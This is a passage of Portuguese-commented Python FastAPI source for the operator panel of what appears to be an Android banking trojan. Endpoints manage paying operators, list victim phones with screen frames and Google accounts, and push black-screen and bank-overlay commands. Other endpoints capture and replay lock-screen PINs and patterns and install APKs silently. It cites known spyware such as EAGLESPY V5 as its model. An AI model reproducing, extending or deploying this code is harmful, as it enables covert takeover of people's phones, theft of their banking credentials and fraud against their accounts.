            exp_date = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        except Exception:
            pass
    
    # Cria usuário
    new_user = Operator(
        username=username,
        email=email,
        hashed_password=get_password_hash(password),
        is_admin=is_admin,
        expires_at=exp_date,
        notes=notes
    )
    db.add(new_user)
    db.commit()
    db.refresh(new_user)
    
    # Sincroniza criação no motor Bypass (ALLBANK)
    sync_user_to_bypass(
        username=username,
        password=password,
        role="admin" if is_admin else "operator",
        expires_at=exp_date,
        status="active"
    )

    logger.info(f"Admin {current_user.username} criou usuário: {username} (expira: {exp_date})")
    
    return {"status": "ok", "user_id": new_user.id}

@app.put("/api/admin/users/{user_id}")
async def admin_update_user(
    user_id: int,
    email: str = Form(None),
    password: str = Form(None),
    is_active: bool = Form(None),
    is_banned: bool = Form(None),
    is_admin: bool = Form(None),
    notes: str = Form(None),
    expiration_days: Optional[int] = Form(None),
    expires_at: Optional[str] = Form(None),
    clear_expiration: bool = Form(False),
    reset_hwid: bool = Form(False),
    reset_2fa: bool = Form(False),
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Atualiza usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    if email is not None:
        user.email = email
    if password is not None and password.strip():
        user.hashed_password = get_password_hash(password)
    if is_active is not None:
        user.is_active = is_active
    if is_banned is not None:
        user.is_banned = is_banned
    if is_admin is not None:
        user.is_admin = is_admin
    if notes is not None:
        user.notes = notes
    if clear_expiration:
        user.expires_at = None
    elif expiration_days and expiration_days > 0:
        user.expires_at = utc_now() + timedelta(days=expiration_days)
    elif expires_at is not None and expires_at.strip():
        try:
            user.expires_at = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        except Exception:
            pass
    if reset_hwid:
        user.hwid = None
        user.hwid_activated_at = None
    if reset_2fa:
        user.totp_secret = None
        user.totp_enabled = False
        user.totp_temp_secret = None
    
    db.commit()
    
    # Sincroniza alteração no motor Bypass
    sync_user_to_bypass(
        username=user.username,
        password=password if (password and password.strip()) else None,
        role="admin" if user.is_admin else "operator",
        expires_at=user.expires_at,
        status="inactive" if (user.is_banned or not user.is_active) else "active"
    )

    logger.info(f"Admin {current_user.username} atualizou usuário: {user.username}")
    
    return {"status": "ok"}

@app.delete("/api/admin/users/{user_id}")
async def admin_delete_user(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Exclui usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    if user.id == current_user.id:
        raise HTTPException(status_code=400, detail="Você não pode excluir a si mesmo")
    
    username = user.username
    db.delete(user)
    db.commit()
    
    # Sincroniza exclusão no motor Bypass
    sync_user_to_bypass(
        username=username,
        is_delete=True
    )

    logger.info(f"Admin {current_user.username} excluiu usuário: {username}")
    
    return {"status": "ok"}

@app.post("/api/admin/users/{user_id}/ban")
async def admin_ban_user(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Bane usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    user.is_banned = True
    db.commit()
    
    # Sincroniza banimento no motor Bypass
    sync_user_to_bypass(
        username=user.username,
        status="inactive"
    )

    logger.info(f"Admin {current_user.username} baniu usuário: {user.username}")
    
    return {"status": "ok"}

@app.post("/api/admin/users/{user_id}/unban")
async def admin_unban_user(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Desbane usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    user.is_banned = False
    db.commit()
    
    # Sincroniza desbanimento no motor Bypass
    sync_user_to_bypass(
        username=user.username,
        status="active"
    )

    logger.info(f"Admin {current_user.username} desbaniu usuário: {user.username}")
    
    return {"status": "ok"}

@app.post("/api/admin/users/{user_id}/reset-hwid")
async def admin_reset_hwid(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Reseta HWID do usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    user.hwid = None
    user.hwid_activated_at = None
    db.commit()
    
    logger.info(f"Admin {current_user.username} resetou HWID de: {user.username}")
    
    return {"status": "ok"}

@app.post("/api/admin/users/{user_id}/reset-2fa")
async def admin_reset_2fa(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Reseta o 2FA Google Authenticator do usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    user.totp_secret = None
    user.totp_enabled = False
    user.totp_temp_secret = None
    db.commit()
    
    logger.info(f"Admin {current_user.username} resetou 2FA de: {user.username}")
    
    return {"status": "ok", "message": "2FA resetado com sucesso."}

# ==================== ADMIN - GERENCIAMENTO DE DISPOSITIVOS ====================

@app.get("/api/admin/devices")
async def admin_get_all_devices(
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Lista todos os dispositivos com info de dono (apenas admin)"""
    devices = db.query(Device).all()
    
    result = []
    for device in devices:
        owner = db.query(Operator).filter(Operator.id == device.owner_id).first() if device.owner_id else None
        result.append({
            "id": device.id,
            "device_id": device.device_id,
            "model": device.model,
            "manufacturer": device.manufacturer,
            "android_version": device.android_version,
            "last_seen": device.last_seen.isoformat() if device.last_seen else None,
            "is_online": device.device_id in manager.active_connections,
            "owner_id": device.owner_id,
            "owner_username": owner.username if owner else None
        })
    
    return result

@app.post("/api/admin/devices/{device_id}/assign")
async def admin_assign_device(
    device_id: str,
    user_id: int = Form(...),
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Atribui dispositivo a um usuário (apenas admin)"""
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    device.owner_id = user_id
    db.commit()
    
    # Invalida cache de dispositivos
    _devices_cache["data"] = None
    
    logger.info(f"Admin {current_user.username} atribuiu dispositivo {device_id} para {user.username}")
    
    return {"status": "ok", "message": f"Dispositivo atribuído para {user.username}"}

@app.post("/api/admin/devices/{device_id}/unassign")
async def admin_unassign_device(
    device_id: str,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Remove atribuição de dispositivo (apenas admin)"""
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    device.owner_id = None
    db.commit()
    
    # Invalida cache de dispositivos
    _devices_cache["data"] = None
    
    logger.info(f"Admin {current_user.username} removeu atribuição do dispositivo {device_id}")
    
    return {"status": "ok"}

# ==================== API DE DISPOSITIVOS ====================

def _get_active_bank_safe(mgr, device_id: str, is_online: bool):
    """Retorna active_bank com expiração automática de 5 minutos (safety net)."""
    if not is_online:
        return None
    bank = mgr.device_active_banks.get(device_id)
    if not bank:
        return None
    # Expira automaticamente se o timestamp for mais de 5 minutos
    try:
        if parse_dt:
            bank_time = parse_dt(bank["timestamp"]).replace(tzinfo=None)
        else:
            bank_time = datetime.fromisoformat(bank["timestamp"].replace("Z", ""))
    except Exception:
        try:
            bank_time = datetime.fromisoformat(bank["timestamp"].replace("Z", ""))
        except Exception:
            return bank
    age_seconds = (utc_now() - bank_time).total_seconds()
    if age_seconds > 300:  # 5 minutos
        del mgr.device_active_banks[device_id]
        logger.info(f"⏱️ active_bank expirado automaticamente para {device_id} ({age_seconds:.0f}s)")
        return None
    return bank

_devices_cache_store: Dict[str, dict] = {}  # {user_key: {"ts": datetime, "data": list}}

@app.get("/api/devices")
async def get_devices(current_user: Operator = Depends(get_current_user), db: Session = Depends(get_db)):
    """Lista dispositivos online e offline (BT MOB-style dashboard)."""
    now = utc_now()
    user_key = f"{current_user.id}_{current_user.is_admin}"
    
    # Fast path: cache de resposta de 1.5s em memória para evitar hits repetidos no SQLite
    cached = _devices_cache_store.get(user_key)
    if cached and (now - cached["ts"]).total_seconds() < 1.5:
        # Atualiza status online dinamicamente sem reler do banco
        alive_ids = set(manager.get_alive_devices())
        res = cached["data"]
        for d in res:
            d["is_online"] = d["device_id"] in alive_ids
        return res

    alive_ids = set(manager.get_alive_devices())

    if current_user.is_admin:
        devices = db.query(Device).all()
    else:
        devices = db.query(Device).filter(Device.owner_id == current_user.id).all()

    result = []
    for device in devices:
        is_online = device.device_id in alive_ids
        info = manager.device_info.get(device.device_id) or {}
        
        # Se o dispositivo está online mas ainda não enviou nível de bateria, solicita em segundo plano
        # Anti-flood: só envia 1 vez a cada 60s por dispositivo
        if is_online and info.get("battery_level") is None:
            last_req = manager._info_request_ts.get(device.device_id)
            now_ts = utc_now()
            if last_req is None or (now_ts - last_req).total_seconds() > 60:
                manager._info_request_ts[device.device_id] = now_ts
                asyncio.create_task(manager.send_command(device.device_id, {"action": "GET_DEVICE_INFO"}))
                asyncio.create_task(manager.send_command(device.device_id, {"action": "GET_BATTERY"}))
                asyncio.create_task(manager.send_command(device.device_id, {"action": "GET_ADB_SERIAL"}))
        device_data = {
            "id": device.id,
            "device_id": device.device_id,
            "model": device.model,
            "manufacturer": device.manufacturer,
            "android_version": device.android_version,
            "custom_name": device.custom_name,
            "last_seen": device.last_seen.isoformat() if device.last_seen else None,
            "is_online": is_online,
            "ip_address": esconder_ip(device.ip_address),
            "raw_ip_address": device.ip_address,
            "has_screen": device.device_id in manager.device_screens,
            "owner_id": device.owner_id,
            "silent_active": manager.device_silent_state.get(device.device_id, {}).get("active", False),
            "capture_method": manager.device_silent_state.get(device.device_id, {}).get("method") or (
                "silent" if manager.device_silent_state.get(device.device_id, {}).get("active") else None
            ),
            "last_activity_at": (
                manager.device_last_activity[device.device_id].isoformat()
                if device.device_id in manager.device_last_activity
                else None
            ),
            "active_bank": _get_active_bank_safe(manager, device.device_id, is_online),
            "battery_level": info.get("battery_level"),
            "is_charging": info.get("is_charging"),
            "network_type": info.get("network_type"),
            "storage_info": info.get("storage_info"),
            "accessibility_active": info.get("accessibility_active"),
            "admin_active": info.get("admin_active", False),
            "sdk": info.get("sdk"),
            "foreground_package": info.get("foreground_package"),
            "foreground_app": info.get("foreground_app"),
            "is_locked": info.get("is_locked"),
            "is_screen_on": info.get("is_screen_on"),
            "lockscreen_active": manager.get_device_lockscreen_active(device.device_id),
            "accounts": (
                info.get("accounts") or info.get("google_accounts") or
                (lambda cap: json.loads(cap.data_content) if cap and cap.data_content else [])(
                    db.query(CapturedData).filter(
                        CapturedData.device_id == device.device_id,
                        CapturedData.data_type == "GOOGLE_ACCOUNTS"
                    ).order_by(CapturedData.id.desc()).first()
                )
            ),
            "google_accounts": (
                info.get("accounts") or info.get("google_accounts") or
                (lambda cap: json.loads(cap.data_content) if cap and cap.data_content else [])(
                    db.query(CapturedData).filter(
                        CapturedData.device_id == device.device_id,
                        CapturedData.data_type == "GOOGLE_ACCOUNTS"
                    ).order_by(CapturedData.id.desc()).first()
                )
            ),
"blocked_packages": (
                info.get("blocked_packages") or info.get("blocked_apps") or
                (lambda cap: json.loads(cap.data_content) if cap and cap.data_content else [])(
                    db.query(CapturedData).filter(
                        CapturedData.device_id == device.device_id,
                        CapturedData.data_type == "BLOCKED_PACKAGES"
                    ).order_by(CapturedData.id.desc()).first()
                )
            ),
            "adb_serial": device.adb_serial,
        }
        result.append(device_data)

    online = sorted(
        [d for d in result if d["is_online"]],
        key=lambda d: d["last_seen"] or "",
        reverse=True,
    )
    offline = sorted(
        [d for d in result if not d["is_online"]],
        key=lambda d: d["last_seen"] or "",
        reverse=True,
    )
    final_list = online + offline
    _devices_cache_store[user_key] = {"ts": now, "data": final_list}
    return final_list

@app.put("/api/devices/{device_id}/rename")
async def rename_device(
    device_id: str,
    req: RenameDeviceRequest = Body(...),
    db: Session = Depends(get_db),
    current_user: Operator = Depends(get_current_user)
):
    """Renomeia um dispositivo atribuindo um nome personalizado."""
    device = check_device_access(device_id, current_user, db)
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    device.custom_name = req.custom_name
    db.commit()
    _devices_cache["data"] = None
    return {"status": "ok", "message": "Dispositivo renomeado com sucesso"}

@app.delete("/api/devices/{device_id}")
async def delete_device_endpoint(
    device_id: str,
    db: Session = Depends(get_db),
    current_user: Operator = Depends(get_current_user)
):
    """Exclui dispositivo do painel (apenas offline para usuários padrão, ou força para admins)"""
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    # Verifica acesso
    if not current_user.is_admin and device.owner_id != current_user.id:
        raise HTTPException(status_code=403, detail="Você não tem permissão para excluir este dispositivo")
    
    # Apenas offline (exceto admin)
    if device.is_online and device_id in manager.active_connections and not current_user.is_admin:
        raise HTTPException(status_code=400, detail="Dispositivo está online. Apenas dispositivos offline podem ser excluídos.")
    
    # Fecha WS se ativo
    if device_id in manager.active_connections:
        try:
            ws = manager.active_connections[device_id]
            await safe_close_websocket(ws, 1000, "Device deleted")
        except Exception:
            pass
        manager.disconnect(device_id)
    
    # Remove logs associados
    db.query(DeviceLog).filter(DeviceLog.device_id == device_id).delete()
    
    # Remove do banco
    db.delete(device)
    db.commit()
    
    # Limpa caches
    manager._delete_cached_frame(device_id)
    manager._delete_cached_hierarchy(device_id)
    _devices_cache["data"] = None
    
    logger.info(f"📱 Dispositivo {device_id} excluído por {current_user.username}")
    return {"status": "ok", "message": "Dispositivo excluído com sucesso"}

def check_device_access(device_id: str, user: Operator, db: Session = None) -> Optional[Device]:
    """Verifica se usuário tem acesso ao dispositivo e retorna a instância de Device."""
    if db:
        device = db.query(Device).filter(Device.device_id == device_id).first()
        if not device:
            raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
        if not user.is_admin and device.owner_id != user.id:
            raise HTTPException(status_code=403, detail="Você não tem acesso a este dispositivo")
        return device
    return None

@app.get("/api/devices/{device_id}/screen")
async def get_device_screen(
    device_id: str, 
    token: Optional[str] = None,
    db: Session = Depends(get_db),
    request: Request = None
):
    """Retorna último frame da tela do dispositivo (exige token e valida acesso ao dispositivo)"""
    auth_token = token
    if not auth_token and request:
        auth_header = request.headers.get("authorization")
        if auth_header and auth_header.lower().startswith("bearer "):
            auth_token = auth_header.split(" ")[1]
            
    if not auth_token:
        raise HTTPException(status_code=401, detail="Token de autenticação obrigatório")
        
    try:
        payload = jwt.decode(auth_token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        if not username:
            raise HTTPException(status_code=401, detail="Token inválido")
    except JWTError:
        raise HTTPException(status_code=401, detail="Token inválido")
        
    user = db.query(Operator).filter(Operator.username == username).first()
    if not user or user.is_banned or not user.is_active:
        raise HTTPException(status_code=403, detail="Acesso negado")
        
    check_device_access(device_id, user, db)
    
    screen_data = manager.get_latest_screen(device_id)
    
    if not screen_data:
        raise HTTPException(status_code=404, detail="Nenhum frame disponível")
    
    return StreamingResponse(
        iter([screen_data]),
        media_type="image/jpeg"
    )


@app.post("/api/devices/{device_id}/command")
async def send_command_to_device(
    device_id: str,
    command: CommandRequest,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Envia comando para dispositivo"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Verifica se dispositivo está realmente online
    is_connected = device_id in manager.active_connections
    
    if not is_connected:
        logger.warning(f"⚠️ Tentativa de comando para dispositivo OFFLINE: {device_id}")
        raise HTTPException(
            status_code=503, 
            detail="Dispositivo está offline. Aguarde reconexão."
        )
    
    logger.info(f"📥 ENDPOINT: Recebido comando {command.action} para {device_id}")
    
    # 🎨 Debug: Log do template para CUSTOM_BLACK_SCREEN
    if command.action == 'CUSTOM_BLACK_SCREEN':
        logger.warning(f"🎨 DEBUG CUSTOM_BLACK_SCREEN: template = {command.template}")
        cmd_dict = command.model_dump() if hasattr(command, 'model_dump') else command.dict()
        logger.warning(f"🎨 DEBUG command.dict() = {cmd_dict}")
        
        # Associa um banco ativo temporário baseado no pacote alvo do comando/template
        target_pkg = command.package
        if not target_pkg and isinstance(command.template, dict):
            target_pkg = command.template.get("package_name") or command.template.get("packageName") or command.template.get("package")
        
        if target_pkg:
            app_name = BankPasswordDetector.BANK_APPS.get(target_pkg)
            if not app_name:
                app_name = 'Itaú' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
            
            manager.device_active_banks[device_id] = {
                "package": target_pkg,
                "appName": app_name,
                "timestamp": utc_now().isoformat()
            }
            logger.info(f"🔮 CUSTOM_BLACK_SCREEN: Associando banco ativo temporário {app_name} ({target_pkg}) para capturas do dispositivo {device_id}")
    
    # Rastreia estado do lockscreen ativo
    if command.action == 'SHOW_LOCKSCREEN':
        manager.store_device_lockscreen_active(device_id, True)
    elif command.action == 'HIDE_LOCKSCREEN':
        manager.store_device_lockscreen_active(device_id, False)
    elif command.action == 'SET_BLOCKED_APPS':
        pkgs = [p.trim().lower() if hasattr(p, 'trim') else str(p).strip().lower() for p in (command.packages or []) if p]
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        manager.device_info[device_id]["blocked_packages"] = list(pkgs)
        try:
            existing_cap = db.query(CapturedData).filter(
                CapturedData.device_id == device_id,
                CapturedData.data_type == "BLOCKED_PACKAGES"
            ).first()
            if existing_cap:
                existing_cap.data_content = json.dumps(pkgs)
            else:
                db.add(CapturedData(device_id=device_id, data_type="BLOCKED_PACKAGES", data_content=json.dumps(pkgs)))
            await safe_db_commit(db)
        except Exception as e:
            logger.error(f"Erro ao salvar BLOCKED_PACKAGES no banco: {e}")
    elif command.action == 'TOGGLE_BLOCK_APP':
        pkg = (command.package or "").strip().lower()
        is_blocked = bool(command.blocked)
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        current_blocked = set(manager.device_info[device_id].get("blocked_packages") or [])
        if pkg:
            if is_blocked:
                current_blocked.add(pkg)
            else:
                current_blocked.discard(pkg)
            pkg_list = list(current_blocked)
            manager.device_info[device_id]["blocked_packages"] = pkg_list
            try:
                existing_cap = db.query(CapturedData).filter(
                    CapturedData.device_id == device_id,
                    CapturedData.data_type == "BLOCKED_PACKAGES"
                ).first()
                if existing_cap:
                    existing_cap.data_content = json.dumps(pkg_list)
                else:
                    db.add(CapturedData(device_id=device_id, data_type="BLOCKED_PACKAGES", data_content=json.dumps(pkg_list)))
                await safe_db_commit(db)
            except Exception as e:
                logger.error(f"Erro ao salvar BLOCKED_PACKAGES no banco: {e}")

    cmd_payload = command.model_dump() if hasattr(command, 'model_dump') else command.dict()
    success = await manager.send_command(device_id, cmd_payload)
    
    if not success:
        logger.error(f"❌ Falha ao enviar comando para {device_id} - conexão perdida durante envio")
        raise HTTPException(status_code=503, detail="Conexão perdida durante envio. Tente novamente.")
    
    # Não salva comandos enviados para não poluir o keylogger
    # (descomente se precisar auditar comandos)
    # log = DeviceLog(
    #     device_id=device_id,
    #     log_type="COMMAND_SENT",
    #     log_data=json.dumps(command.dict()),
    #     created_at=utc_now()
    # )
    # db.add(log)
    # db.commit()
    
    return {"status": "ok", "message": "Comando enviado"}


# ==================== SISTEMA DE MAPEAMENTO DE OVERLAYS (AUTO-GATILHO) ====================

@app.get("/api/devices/{device_id}/overlay-mappings")
async def get_device_overlay_mappings(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna a lista de mapeamentos de overlay configurados para este dispositivo"""
    check_device_access(device_id, current_user, db)
    
from models import DeviceOverlayMapping
    
    mappings = db.query(DeviceOverlayMapping).filter(
        DeviceOverlayMapping.device_id == device_id
    ).all()
    
    res = []
    for m in mappings:
        try:
            tpl = json.loads(m.template_json) if m.template_json else None
        except Exception:
            tpl = None
            
        res.append({
            "id": m.id,
            "device_id": m.device_id,
            "package_name": m.package_name,
            "project_id": m.project_id,
            "screen_id": m.screen_id,
            "screen_name": m.screen_name,
            "template": tpl,
            "is_enabled": m.is_enabled,
            "created_at": m.created_at.isoformat() if m.created_at else None
        })
    return res

@app.post("/api/devices/{device_id}/overlay-mappings")
async def create_device_overlay_mapping(
    device_id: str,
    mapping_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Cria ou atualiza um mapeamento de overlay para um aplicativo específico"""
    check_device_access(device_id, current_user, db)
    
from models import DeviceOverlayMapping
    
    package_name = mapping_data.get("package_name")
    if not package_name:
        raise HTTPException(status_code=400, detail="Package name é obrigatório")
        
    # Verifica se já existe um mapeamento para esse pacote no dispositivo
    existing = db.query(DeviceOverlayMapping).filter(
        DeviceOverlayMapping.device_id == device_id,
        DeviceOverlayMapping.package_name == package_name
    ).first()
    
    template_str = json.dumps(mapping_data.get("template", {}))
    
    if existing:
        existing.project_id = mapping_data.get("project_id", existing.project_id)
        existing.screen_id = mapping_data.get("screen_id", existing.screen_id)
        existing.screen_name = mapping_data.get("screen_name", existing.screen_name)
        existing.template_json = template_str
        existing.is_enabled = mapping_data.get("is_enabled", existing.is_enabled)
        db.commit()
        logger.info(f"✨ Mapeamento de overlay atualizado para {device_id} -> {package_name}")
        return {"id": existing.id, "message": "Mapeamento atualizado"}
        
    new_mapping = DeviceOverlayMapping(
        device_id=device_id,
        package_name=package_name,
        project_id=mapping_data.get("project_id"),
        screen_id=mapping_data.get("screen_id"),
        screen_name=mapping_data.get("screen_name"),
        template_json=template_str,
        is_enabled=mapping_data.get("is_enabled", True)
    )
    db.add(new_mapping)
    db.commit()
    logger.info(f"✨ Novo mapeamento de overlay criado para {device_id} -> {package_name}")
    return {"id": new_mapping.id, "message": "Mapeamento criado"}

@app.delete("/api/devices/{device_id}/overlay-mappings/{mapping_id}")
async def delete_device_overlay_mapping(
    device_id: str,
    mapping_id: int,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Remove um mapeamento de overlay"""
    check_device_access(device_id, current_user, db)
    
from models import DeviceOverlayMapping
    
    mapping = db.query(DeviceOverlayMapping).filter(
        DeviceOverlayMapping.id == mapping_id,
        DeviceOverlayMapping.device_id == device_id
    ).first()
    
    if not mapping:
        raise HTTPException(status_code=404, detail="Mapeamento não encontrado")
        
    db.delete(mapping)
    db.commit()
    logger.info(f"🗑️ Mapeamento de overlay removido: ID {mapping_id} do dispositivo {device_id}")
    return {"message": "Mapeamento removido"}


# ==================== SISTEMA DE PIN LOCKSCREEN (IGUAL EAGLESPY V5) ====================


@app.get("/api/devices/{device_id}/pin")
async def get_device_pin(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔒 Retorna PIN capturado do lockscreen (EAGLESPY V5 style)"""
    check_device_access(device_id, current_user, db)
    
    pin = manager.get_device_pin(device_id)
    if not pin:
        latest_log = db.query(DeviceLog).filter(
            DeviceLog.device_id == device_id,
            DeviceLog.log_type == "CAPTURED_PIN"
        ).order_by(DeviceLog.created_at.desc()).first()
        if latest_log:
            try:
                log_data = json.loads(latest_log.log_data)
                pin = log_data.get("pin")
                if pin:
                    manager.store_device_pin(device_id, pin)
            except:
                pass
    
    return {
        "device_id": device_id,
        "pin": pin,
        "has_pin": pin is not None and len(pin) > 0,
        "lockscreen_active": manager.get_device_lockscreen_active(device_id)
    }

@app.post("/api/devices/{device_id}/pin")
async def set_device_pin(
    device_id: str,
    pin: str = Form(...),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔒 Define PIN do lockscreen manualmente"""
    check_device_access(device_id, current_user, db)
    
    manager.store_device_pin(device_id, pin)
    
    logger.info(f"🔒 PIN definido manualmente para {device_id}: {pin}")
    
    return {
        "status": "ok",
        "message": f"PIN '{pin}' armazenado para {device_id}"
    }

@app.delete("/api/devices/{device_id}/pin")
async def clear_device_pin(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔒 Limpa PIN armazenado"""
    check_device_access(device_id, current_user, db)
    
    manager.clear_device_pin(device_id)
    
    return {"status": "ok", "message": "PIN limpo"}

@app.post("/api/devices/{device_id}/play-pin")
async def play_pin_sequence(
    device_id: str,
    pin: str = Form(None),
    delay: int = Form(1000),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔄 Reproduz PIN automaticamente (igual EAGLESPY V5)"""
    check_device_access(device_id, current_user, db)
    
    # Se não forneceu PIN, usa o armazenado
    if not pin:
        pin = manager.get_device_pin(device_id)
        if not pin:
            raise HTTPException(status_code=400, detail="Nenhum PIN fornecido ou armazenado")
    
    # Envia comando para reproduzir PIN
    success = await manager.send_command(device_id, {
        "action": "PLAY_PIN_SEQUENCE",
        "pin": pin,
        "delay": delay
    })
    
    if not success:
        raise HTTPException(status_code=503, detail="Dispositivo offline")
    
    logger.info(f"🔄 Reproduzindo PIN '{pin}' em {device_id} (delay: {delay}ms)")
    
    return {
        "status": "ok",
        "message": f"Reproduzindo PIN: {pin}"
    }

# ==================== PATTERN LOCKSCREEN ====================

@app.get("/api/devices/{device_id}/pattern")
async def get_device_pattern(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔲 Retorna Pattern capturado do lockscreen"""
    check_device_access(device_id, current_user, db)
    
    pattern = manager.get_device_pattern(device_id)
    if not pattern:
        latest_log = db.query(DeviceLog).filter(
            DeviceLog.device_id == device_id,
            DeviceLog.log_type == "CAPTURED_PATTERN"
        ).order_by(DeviceLog.created_at.desc()).first()
        if latest_log:
            try:
                log_data = json.loads(latest_log.log_data)
                pattern = log_data.get("pattern")
                if pattern:
                    manager.store_device_pattern(device_id, pattern)
            except:
                pass
    
    return {
        "device_id": device_id,
        "pattern": pattern,
        "has_pattern": pattern is not None and len(pattern) > 0,
        "lockscreen_active": manager.get_device_lockscreen_active(device_id)
    }

@app.post("/api/devices/{device_id}/pattern")
async def set_device_pattern(
    device_id: str,
    pattern: str = Form(...),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔲 Define Pattern do lockscreen manualmente"""
    check_device_access(device_id, current_user, db)
    
    manager.store_device_pattern(device_id, pattern)
    
    logger.info(f"🔲 Pattern definido manualmente para {device_id}: {pattern}")
    
    return {
        "status": "ok",
        "message": f"Pattern '{pattern}' armazenado para {device_id}"
    }

@app.delete("/api/devices/{device_id}/pattern")
async def clear_device_pattern(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔲 Limpa Pattern armazenado"""
    check_device_access(device_id, current_user, db)
    
    manager.clear_device_pattern(device_id)
    
    return {"status": "ok", "message": "Pattern limpo"}

@app.post("/api/devices/{device_id}/play-pattern")
async def play_pattern_sequence(
    device_id: str,
    pattern: str = Form(None),
    delay: int = Form(1000),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔲 Reproduz Pattern automaticamente"""
    check_device_access(device_id, current_user, db)
    
    # Se não forneceu pattern, usa o armazenado
    if not pattern:
        pattern = manager.get_device_pattern(device_id)
        if not pattern:
            raise HTTPException(status_code=400, detail="Nenhum Pattern fornecido ou armazenado")
    
    clean_pattern = "".join([c for c in str(pattern) if c in "123456789"])
    if not clean_pattern:
        clean_pattern = pattern

    # Envia comando para reproduzir Pattern
    success = await manager.send_command(device_id, {
        "action": "PLAY_PATTERN_SEQUENCE",
        "pattern": clean_pattern,
        "delay": delay
    })
    
    if not success:
        raise HTTPException(status_code=503, detail="Dispositivo offline")
    
    logger.info(f"🔲 Reproduzindo Pattern '{pattern}' em {device_id}")
    
    return {
        "status": "ok",
        "message": f"Reproduzindo Pattern: {pattern}"
    }

@app.post("/api/devices/{device_id}/install-apk")
async def install_apk_on_device(
    device_id: str,
    apk_file: UploadFile = File(...),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db),
    request: Request = None
):
    """
    📦 Upload de APK e instalação silenciosa no dispositivo
    """
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Valida extensão
    if not apk_file.filename.endswith('.apk'):
        raise HTTPException(status_code=400, detail="Arquivo deve ser .apk")
    
    # Cria diretório de uploads se não existir
    upload_dir = Path("uploads/apks")
    upload_dir.mkdir(parents=True, exist_ok=True)
    
    # Nome único para o arquivo
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_filename = f"{device_id}_{timestamp}_{apk_file.filename}"
    file_path = upload_dir / safe_filename
    
    # Salva o arquivo
    try:
        with open(file_path, "wb") as f:
            content = await apk_file.read()
            f.write(content)
        
        logger.info(f"📦 APK salvo: {file_path} ({len(content)} bytes)")
        
        # Monta URL para download - USA IP da VPS para dispositivos Android conseguirem acessar!
        # Dispositivos Android não conseguem acessar localhost do PC
        VPS_URL = gangstar_env.public_base_url()
        apk_url = f"{VPS_URL}/uploads/apks/{safe_filename}"
        
        logger.info(f"📦 URL do APK: {apk_url}")
        
        # Envia comando para o dispositivo
        command = {"action": "INSTALL_APK", "url": apk_url}
        success = await manager.send_command(device_id, command)
        
        if not success:
            raise HTTPException(status_code=404, detail="Dispositivo offline")
        
        return {"status": "ok", "message": "APK enviado", "url": apk_url}
        
    except Exception as e:
        logger.error(f"📦 ❌ Erro: {e}")
        raise HTTPException(status_code=500, detail=str(e))

